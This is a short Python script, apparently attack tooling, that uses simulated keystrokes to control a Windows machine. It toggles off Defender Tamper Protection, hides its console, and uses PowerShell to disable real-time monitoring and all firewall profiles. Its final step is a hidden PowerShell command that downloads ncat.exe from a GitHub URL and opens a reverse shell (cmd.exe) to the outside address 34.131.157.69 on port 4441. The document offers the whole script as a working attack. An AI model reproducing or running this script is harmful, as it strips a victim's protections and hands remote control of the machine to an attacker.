import pyautogui
import time
import subprocess
import ctypes


#start tamper protection attack


pyautogui.hotkey('win', 'r') 

payload1= 'mssettings:windowsdefender'

pyautogui.write(payload1, interval=0.005)

pyautogui.press('enter')

pyautogui.press('tab', presses=4, interval=1)  # Navigate to the "Virus & threat protection" section
pyautogui.press('enter')

# Wait for the settings window to open
time.sleep(2)
# Step 5: Disable tamper protection
pyautogui.press('tab', presses=4, interval=1)  # Navigate to the "Tamper Protection" toggle

pyautogui.press('space')  # Toggle the switch to disable tamper protection

# Wait for the toggle to take effect
time.sleep(2)
# Step 6: Close the settings window
pyautogui.hotkey('alt', 'f4')  # Close the settings window

pyautogui.hotkey('alt', 'f4')  # Close the defender window





#turn off firewall and defender 





# Step 1: Hide terminal window (Windows only)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Step 2: Wait for system to be ready
time.sleep(2)

# Step 3: Simulate keystrokes
pyautogui.hotkey('win', 'r')           # Win + R
time.sleep(0.5)
pyautogui.write('powershell', interval=0.05)
pyautogui.press('enter')
time.sleep(1)


# Step 3: Disable Windows Defender
pyautogui.write('Set-MpPreference -DisableRealtimeMonitoring $true', interval=0.01)
pyautogui.press('enter')
time.sleep(1)   

# Step 3: Disable Windows Firewall
pyautogui.write('Set-NetFirewallProfile -All -Enabled False', interval=0.01)
pyautogui.press('enter')
time.sleep(1)


# Step 4: Type the payload
payload = 'powershell -w Hidden -Command Invoke-WebRequest -Uri https://github.com/err0r-arsenal/netcat/raw/refs/heads/main/ncat.exe -OutFile cat.exe; ./cat.exe 34.131.157.69 4441 -e cmd.exe'
pyautogui.write(payload, interval=0.005)
pyautogui.press('enter')
